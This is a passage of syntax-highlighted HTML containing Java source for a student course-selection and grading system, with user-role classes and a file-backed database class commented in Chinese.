class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">User</span>&#123;</span><br><span class="line">    String user;    <span class="comment">// 用户名</span></span><br><span class="line">    String pwd;     <span class="comment">// 密码</span></span><br><span class="line">    <span class="type">int</span> type;       <span class="comment">// 用户类型</span></span><br><span class="line">    <span class="type">int</span> account_id; <span class="comment">// 用户编号</span></span><br><span class="line">    String account_name;    <span class="comment">// 用户名字</span></span><br><span class="line">    Teach teach;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">User</span><span class="params">(String user, String pwd, <span class="type">int</span> type, <span class="type">int</span> account_id, String account_name, Teach teach)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.user = user;</span><br><span class="line">        <span class="built_in">this</span>.pwd = pwd;</span><br><span class="line">        <span class="built_in">this</span>.type = type;</span><br><span class="line">        <span class="built_in">this</span>.account_id = account_id;</span><br><span class="line">        <span class="built_in">this</span>.account_name = account_name;</span><br><span class="line">        <span class="built_in">this</span>.teach = teach;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getType</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> type;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getUser</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> user;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getUsername</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> account_name;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getUserId</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> account_id;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Student</span> <span class="keyword">extends</span> <span class="title class_">User</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Student</span><span class="params">(String user, String pwd, <span class="type">int</span> type, <span class="type">int</span> account_id, String account_name, Teach teach)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>(user, pwd, type, account_id, account_name, teach);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 学生选课。如果成功，返回1，如果失败，返回-1</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">selStuCourse</span><span class="params">(<span class="type">int</span> course_id)</span> &#123;</span><br><span class="line">        teach.selStuCourse(account_id, course_id);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 查询学生可选课程。 返回可选课程字典</span></span><br><span class="line">    <span class="keyword">public</span> HashMap&lt;Integer, List&gt; <span class="title function_">getCourseStuNotSelected</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> teach.getCourseStuNotSelected(account_id);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 学生退课。如果成功，返回1，如果失败，返回-1</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">delStuCourse</span><span class="params">(<span class="type">int</span> course_id)</span> &#123;</span><br><span class="line">        teach.delStuCourse(account_id, course_id);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 查询学生所选课程信息。 返回所选课程列表</span></span><br><span class="line">    <span class="keyword">public</span> ArrayList&lt;List&gt; <span class="title function_">getScoreStu</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> teach.getScoreStu(account_id);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Teacher</span> <span class="keyword">extends</span> <span class="title class_">User</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Teacher</span><span class="params">(String user, String pwd, <span class="type">int</span> type, <span class="type">int</span> account_id, String account_name, Teach teach)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>(user, pwd, type, account_id, account_name, teach);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 查询课程所有学生成绩。 返回成绩列表</span></span><br><span class="line">    <span class="keyword">public</span> ArrayList&lt;List&gt; <span class="title function_">getScoreTeacher</span><span class="params">(<span class="type">int</span> course_id)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> teach.getScoreTeacher(course_id);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 查询选中课程详细信息。返回课程信息</span></span><br><span class="line">    <span class="keyword">public</span> List <span class="title function_">getCourseInfo</span><span class="params">(<span class="type">int</span> course_id)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> teach.getCourseInfo(course_id);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 教师对学生课程打分。</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">scoreStuCourse</span><span class="params">(<span class="type">int</span> student_id, <span class="type">int</span> course_id, <span class="type">int</span> student_score)</span> &#123;</span><br><span class="line">        teach.scoreStuCourse(student_id, course_id, student_score);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Manager</span> <span class="keyword">extends</span> <span class="title class_">User</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Manager</span><span class="params">(String user, String pwd, <span class="type">int</span> type, <span class="type">int</span> account_id, String account_name, Teach teach)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>(user, pwd, type, account_id, account_name,teach);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 新建课程。如果成功，返回课程编号，如果失败，返回-1</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">newCourse</span><span class="params">(String course_name, <span class="type">int</span> teacher_id , String course_info)</span> &#123;</span><br><span class="line">        teach.newCourse(course_name, teacher_id, course_info);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Teach</span>&#123;</span><br><span class="line">    <span class="keyword">private</span> Database db;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Teach</span><span class="params">(Database db)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.db = db;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 新建课程，进行检查并进行数据库存入。如果成功，返回课程编号，如果失败，返回-1</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">newCourse</span><span class="params">(String course_name, <span class="type">int</span> teacher_id , String course_info)</span> &#123;</span><br><span class="line">        db.addCourse(course_name, teacher_id, course_info);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 学生选课，进行检查并进行数据库存入。如果成功，返回1，如果失败，返回-1</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">selStuCourse</span><span class="params">(<span class="type">int</span> account_id, <span class="type">int</span> course_id)</span> &#123;</span><br><span class="line">        db.addStuCourse(account_id, course_id);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 学生退课，进行检查并进行数据库存入。如果成功，返回1，如果失败，返回-1</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">delStuCourse</span><span class="params">(<span class="type">int</span> account_id, <span class="type">int</span> course_id)</span> &#123;</span><br><span class="line">        db.delStuCourse(account_id, course_id);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 教师对学生课程打分。</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">scoreStuCourse</span><span class="params">(<span class="type">int</span> student_id, <span class="type">int</span> course_id, <span class="type">int</span> student_score)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(student_score&lt;-<span class="number">1</span> | student_score&gt;<span class="number">100</span>) &#123;</span><br><span class="line">            JOptionPane.showMessageDialog(<span class="literal">null</span>, <span class="string">&quot;请输入0-100的整数&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            db.addStuScore(student_id, course_id, student_score);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 查询课程详细信息。返回课程信息</span></span><br><span class="line">    <span class="keyword">public</span> List <span class="title function_">getCourseInfo</span><span class="params">(<span class="type">int</span> course_id)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> db.getCourse().get(course_id);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 查询课程所有学生成绩。 返回成绩列表</span></span><br><span class="line">    <span class="keyword">public</span> ArrayList&lt;List&gt; <span class="title function_">getScoreTeacher</span><span class="params">(<span class="type">int</span> course_id)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> db.getScoreCourse(course_id);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 查询学生可选课程。 返回可选课程字典</span></span><br><span class="line">    <span class="keyword">public</span> HashMap&lt;Integer, List&gt; <span class="title function_">getCourseStuNotSelected</span><span class="params">(<span class="type">int</span> account_id)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> db.getCourseNotSelected(account_id);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 查询学生所选课程信息。 返回所选课程列表</span></span><br><span class="line">    <span class="keyword">public</span> ArrayList&lt;List&gt; <span class="title function_">getScoreStu</span><span class="params">(<span class="type">int</span> account_id)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> db.getScoreStu(account_id);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Database</span> &#123;</span><br><span class="line">    <span class="comment">// 存储文件</span></span><br><span class="line">    <span class="keyword">private</span> File data_course;</span><br><span class="line">    <span class="keyword">private</span> File data_score;</span><br><span class="line">    <span class="keyword">private</span> File data_account;</span><br><span class="line">    <span class="comment">// 当前最大编号，用于新增时</span></span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> <span class="variable">course_id</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> <span class="variable">student_id</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> <span class="variable">teacher_id</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> <span class="variable">manager_id</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">    <span class="comment">// 运行时数据存储</span></span><br><span class="line">    <span class="keyword">private</span> HashMap&lt;Integer, List&gt; course = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;Integer, List&gt;();</span><br><span class="line">    <span class="keyword">private</span> HashMap&lt;String, List&gt; account = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;String, List&gt;();</span><br><span class="line">    <span class="keyword">private</span> HashMap&lt;Integer, String&gt; manager = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;Integer, String&gt;();</span><br><span class="line">    <span class="keyword">private</span> HashMap&lt;Integer, String&gt; teacher = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;Integer, String&gt;();</span><br><span class="line">    <span class="keyword">private</span> HashMap&lt;Integer, String&gt; student = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;Integer, String&gt;();</span><br><span class="line">    <span class="keyword">private</span> ArrayList&lt;List&gt; score = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;List&gt;();</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 参数：存储文件位置</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Database</span><span class="params">(String file_course, String file_score, String file_account)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="built_in">this</span>.data_course = <span class="keyword">new</span> <span class="title class_">File</span>(file_course);</span><br><span class="line">        <span class="built_in">this</span>.data_score = <span class="keyword">new</span> <span class="title class_">File</span>(file_score);</span><br><span class="line">        <span class="built_in">this</span>.data_account = <span class="keyword">new</span> <span class="title class_">File</span>(file_account);</span><br><span class="line">        <span class="built_in">this</span>.readIn();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> HashMap&lt;Integer, List&gt; <span class="title function_">getCourse</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> course;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> HashMap&lt;Integer, List&gt; <span class="title function_">getCourseNotSelected</span><span class="params">(<span class="type">int</span> student_id)</span> &#123;</span><br><span class="line">        HashMap&lt;Integer, List&gt; map_copy = (HashMap&lt;Integer, List&gt;) course.clone();</span><br><span class="line">        System.out.println(map_copy.toString());</span><br><span class="line">        <span class="keyword">for</span>(List l: score) &#123;</span><br><span class="line">            <span class="keyword">if</span>((<span class="type">int</span>)l.get(<span class="number">0</span>)==student_id) &#123;</span><br><span class="line">                map_copy.remove((<span class="type">int</span>)l.get(<span class="number">1</span>));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(map_copy.toString());</span><br><span class="line">        <span class="keyword">return</span> map_copy;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> List <span class="title function_">getTeacherCourse</span><span class="params">(<span class="type">int</span> teacher_id)</span> &#123;</span><br><span class="line">        <span class="type">List</span> <span class="variable">teacher_course_list</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ArrayList</span>();</span><br><span class="line">        <span class="keyword">for</span>(Entry&lt;Integer, List&gt; entry: course.entrySet()) &#123;</span><br><span class="line">            <span class="keyword">if</span>((<span class="type">int</span>)entry.getValue().get(<span class="number">1</span>)==teacher_id) &#123;</span><br><span class="line">                teacher_course_list.add((<span class="type">int</span>)entry.getKey());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> teacher_course_list;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> ArrayList&lt;List&gt; <span class="title function_">getScoreCourse</span><span class="params">(<span class="type">int</span> course_id)</span> &#123;</span><br><span class="line">        ArrayList&lt;List&gt; list_copy = <span class="keyword">new</span> <span class="title class_">ArrayList</span>();</span><br><span class="line">        <span class="keyword">for</span>(List l : score) &#123;</span><br><span class="line">            <span class="keyword">if</span>((<span class="type">int</span>)l.get(<span class="number">1</span>)==course_id) &#123;</span><br><span class="line">                list_copy.add(l);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> list_copy;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> HashMap&lt;Integer, String&gt; <span class="title function_">getTeacher</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> teacher;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> HashMap&lt;Integer, String&gt; <span class="title function_">getStudent</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> student;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> ArrayList&lt;List&gt; <span class="title function_">getScore</span><span class="params">(<span class="type">int</span> student_id)</span> &#123;</span><br><span class="line">        ArrayList&lt;List&gt; list_copy = <span class="keyword">new</span> <span class="title class_">ArrayList</span>();</span><br><span class="line">        <span class="keyword">for</span>(List l : score) &#123;</span><br><span class="line">            <span class="keyword">if</span>((<span class="type">int</span>)l.get(<span class="number">0</span>)==student_id) &#123;</span><br><span class="line">                list_copy.add(l);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> list_copy;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> ArrayList&lt;List&gt; <span class="title function_">getScoreStu</span><span class="params">(<span class="type">int</span> student_id)</span> &#123;</span><br><span class="line">        ArrayList&lt;List&gt; list_copy = <span class="keyword">new</span> <span class="title class_">ArrayList</span>();</span><br><span class="line">        <span class="keyword">for</span>(List l : score) &#123;</span><br><span class="line">            <span class="keyword">if</span>((<span class="type">int</span>)l.get(<span class="number">0</span>)==student_id) &#123;</span><br><span class="line">                list_copy.add(l);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> list_copy;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> HashMap&lt;String, List&gt; <span class="title function_">getAccount</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> account;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> List <span class="title function_">getAccount</span><span class="params">(String user)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> account.get(user);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//从文件中读入课程、用户名等数据</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">readIn</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">RandomAccessFile</span> <span class="variable">raf_course</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RandomAccessFile</span>(data_course,<span class="string">&quot;rw&quot;</span>);</span><br><span class="line">        <span class="type">RandomAccessFile</span> <span class="variable">raf_score</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RandomAccessFile</span>(data_score,<span class="string">&quot;rw&quot;</span>);</span><br><span class="line">        <span class="type">RandomAccessFile</span> <span class="variable">raf_account</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RandomAccessFile</span>(data_account,<span class="string">&quot;rw&quot;</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="type">long</span> <span class="variable">fileLength</span> <span class="operator">=</span> raf_course.length();</span><br><span class="line">        <span class="type">long</span> <span class="variable">filePoint</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> course_id;</span><br><span class="line">        String course_name;</span><br><span class="line">        <span class="type">int</span> course_teacher_id;</span><br><span class="line">        String course_info;</span><br><span class="line">        raf_course.seek(<span class="number">0</span>);</span><br><span class="line">        <span class="keyword">if</span>(filePoint &lt; fileLength) &#123;</span><br><span class="line">            <span class="built_in">this</span>.course_id = Integer.parseInt(raf_course.readLine());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span>(filePoint &lt; fileLength) &#123;</span><br><span class="line">            course_id = Integer.parseInt(raf_course.readLine());</span><br><span class="line">            course_name = raf_course.readLine();</span><br><span class="line">            course_name = <span class="keyword">new</span> <span class="title class_">String</span>(course_name.getBytes(<span class="string">&quot;ISO-8859-1&quot;</span>),<span class="string">&quot;gbk&quot;</span>);</span><br><span class="line">            course_teacher_id = Integer.parseInt(raf_course.readLine());</span><br><span class="line">            course_info = raf_course.readLine();</span><br><span class="line">            course_info = <span class="keyword">new</span> <span class="title class_">String</span>(course_info.getBytes(<span class="string">&quot;ISO-8859-1&quot;</span>),<span class="string">&quot;gbk&quot;</span>);</span><br><span class="line">            course.put(course_id, Arrays.asList(course_name,course_teacher_id,course_info));</span><br><span class="line">            filePoint = raf_course.getFilePointer();</span><br><span class="line">        &#125;</span><br><span class="line">        raf_course.close();</span><br><span class="line">        </span><br><span class="line">        fileLength = raf_account.length();</span><br><span class="line">        filePoint = <span class="number">0</span>;</span><br><span class="line">        String account_user;</span><br><span class="line">        String account_pwd;</span><br><span class="line">        <span class="type">int</span> account_type;</span><br><span class="line">        Integer account_id;</span><br><span class="line">        String account_name;</span><br><span class="line"></span><br><span class="line">        raf_account.seek(<span class="number">0</span>);</span><br><span class="line">        <span class="keyword">if</span>(filePoint &lt; fileLength) &#123;</span><br><span class="line">            <span class="built_in">this</span>.manager_id = Integer.parseInt(raf_account.readLine());</span><br><span class="line">            <span class="built_in">this</span>.teacher_id = Integer.parseInt(raf_account.readLine());</span><br><span class="line">            <span class="built_in">this</span>.student_id = Integer.parseInt(raf_account.readLine());</span><br><span class="line">            filePoint = raf_account.getFilePointer();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span>(filePoint &lt; fileLength) &#123;</span><br><span class="line">            account_user = raf_account.readLine();</span><br><span class="line">            account_user = <span class="keyword">new</span> <span class="title class_">String</span>(account_user.getBytes(<span class="string">&quot;ISO-8859-1&quot;</span>),<span class="string">&quot;gbk&quot;</span>);</span><br><span class="line">            account_pwd = raf_account.readLine();</span><br><span class="line">            account_pwd = <span class="keyword">new</span> <span class="title class_">String</span>(account_pwd.getBytes(<span class="string">&quot;ISO-8859-1&quot;</span>),<span class="string">&quot;gbk&quot;</span>);</span><br><span class="line">            account_type = Integer.parseInt(raf_account.readLine());</span><br><span class="line">            account_id = Integer.parseInt(raf_account.readLine());</span><br><span class="line">            account_name = raf_account.readLine();</span><br><span class="line">            account_name = <span class="keyword">new</span> <span class="title class_">String</span>(account_name.getBytes(<span class="string">&quot;ISO-8859-1&quot;</span>),<span class="string">&quot;gbk&quot;</span>);</span><br><span class="line">            <span class="keyword">switch</span>(account_type) &#123;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">                    manager.put(account_id, account_name);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">                    teacher.put(account_id, account_name);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">                    student.put(account_id, account_name);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            account.put(account_user, Arrays.asList(account_pwd, account_type, account_id,account_name));</span><br><span class="line">            filePoint = raf_account.getFilePointer();</span><br><span class="line">        &#125;</span><br><span class="line">        raf_account.close();</span><br><span class="line">        </span><br><span class="line">        </span><br><span class="line">        fileLength = raf_score.length();</span><br><span class="line">        filePoint = <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> student_id;</span><br><span class="line">        <span class="type">int</span> student_course_id;</span><br><span class="line">        <span class="type">int</span> student_score;</span><br><span class="line">        raf_score.seek(<span class="number">0</span>);</span><br><span class="line">        <span class="keyword">while</span>(filePoint &lt; fileLength) &#123;</span><br><span class="line">            student_id = Integer.parseInt(raf_score.readLine());</span><br><span class="line">            student_course_id = Integer.parseInt(raf_score.readLine());</span><br><span class="line">            student_score = Integer.parseInt(raf_score.readLine());</span><br><span class="line">            score.add(Arrays.asList(student_id,student_course_id,student_score));</span><br><span class="line">            filePoint = raf_score.getFilePointer();</span><br><span class="line">        &#125;</span><br><span class="line">        raf_score.close();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//创建用户  </span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">addAccount</span><span class="params">(String account_user, String account_pwd, <span class="type">int</span> account_type, String account_name)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">id</span> <span class="operator">=</span> -<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span>(!account.containsKey(account_user)) &#123;</span><br><span class="line">            <span class="keyword">switch</span>(account_type) &#123;</span><br><span class="line">                <span class="keyword">case</span>(<span class="number">0</span>):</span><br><span class="line">                    manager_id = manager_id+<span class="number">1</span>;</span><br><span class="line">                    id = manager_id;</span><br><span class="line">                    manager.put(id, account_name);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span>(<span class="number">1</span>):</span><br><span class="line">                    teacher_id = teacher_id+<span class="number">1</span>;</span><br><span class="line">                    id = teacher_id;</span><br><span class="line">                    teacher.put(id, account_name);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span>(<span class="number">2</span>):</span><br><span class="line">                    student_id = student_id+<span class="number">1</span>;</span><br><span class="line">                    id = student_id;</span><br><span class="line">                    student.put(id, account_name);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            account.put(account_user, Arrays.asList(account_pwd, account_type, id, account_name));</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;Account &quot;</span>+account_user+<span class="string">&quot; has already exists.&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        updateAccountData();</span><br><span class="line">    &#125;</span><br><span class="line">     </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">addCourse</span><span class="params">(String course_name, <span class="type">int</span> course_teacher_id, String course_info)</span> &#123;</span><br><span class="line">        course_id = course_id + <span class="number">1</span>;</span><br><span class="line">        course.put(course_id, Arrays.asList(course_name, course_teacher_id, course_info));</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">addStuCourse</span><span class="params">(<span class="type">int</span> student_id, <span class="type">int</span> course_id)</span> &#123;</span><br><span class="line">        score.add(Arrays.asList(student_id, course_id, -<span class="number">1</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">delStuCourse</span><span class="params">(<span class="type">int</span> student_id, <span class="type">int</span> course_id)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;del &quot;</span>+student_id+<span class="string">&quot; &quot;</span>+course_id);</span><br><span class="line">        Iterator&lt;List&gt; i = score.iterator();</span><br><span class="line">        <span class="keyword">while</span>(i.hasNext())&#123;</span><br><span class="line">            <span class="type">List</span> <span class="variable">l</span> <span class="operator">=</span> i.next();</span><br><span class="line">            <span class="keyword">if</span>((<span class="type">int</span>)l.get(<span class="number">0</span>)==student_id &amp; (<span class="type">int</span>)l.get(<span class="number">1</span>)==course_id)&#123;</span><br><span class="line">                i.remove();</span><br><span class="line">            &#125;        </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">addStuScore</span><span class="params">(<span class="type">int</span> student_id, <span class="type">int</span> course_id, <span class="type">int</span> student_score)</span> &#123;</span><br><span class="line">        <span class="keyword">for</span>(List&lt;Integer&gt; l:score) &#123;</span><br><span class="line">            <span class="keyword">if</span>(l.get(<span class="number">0</span>)==student_id &amp; l.get(<span class="number">1</span>)==course_id) &#123;</span><br><span class="line">                l.set(<span class="number">2</span>, student_score);</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">clearFile</span><span class="params">(File file)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">FileWriter</span> <span class="variable">fileWriter</span> <span class="operator">=</span><span class="keyword">new</span> <span class="title class_">FileWriter</span>(file);</span><br><span class="line">        fileWriter.write(<span class="string">&quot;&quot;</span>);</span><br><span class="line">        fileWriter.flush();</span><br><span class="line">        fileWriter.close();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">updateCourseData</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        clearFile(data_course);</span><br><span class="line">        <span class="type">RandomAccessFile</span> <span class="variable">raf_course</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RandomAccessFile</span>(data_course,<span class="string">&quot;rw&quot;</span>);</span><br><span class="line">        raf_course.writeBytes(course_id+<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> key:course.keySet()) &#123;</span><br><span class="line">            raf_course.write((key+<span class="string">&quot;\n&quot;</span>).getBytes());</span><br><span class="line">            raf_course.write((course.get(key).get(<span class="number">0</span>)+<span class="string">&quot;\n&quot;</span>).getBytes());</span><br><span class="line">            raf_course.write((course.get(key).get(<span class="number">1</span>)+<span class="string">&quot;\n&quot;</span>).getBytes());</span><br><span class="line">            raf_course.write((course.get(key).get(<span class="number">2</span>)+<span class="string">&quot;\n&quot;</span>).getBytes());</span><br><span class="line">        &#125;</span><br><span class="line">        raf_course.close();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">updateScoreData</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        clearFile(data_score);</span><br><span class="line">        <span class="type">RandomAccessFile</span> <span class="variable">raf_score</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title 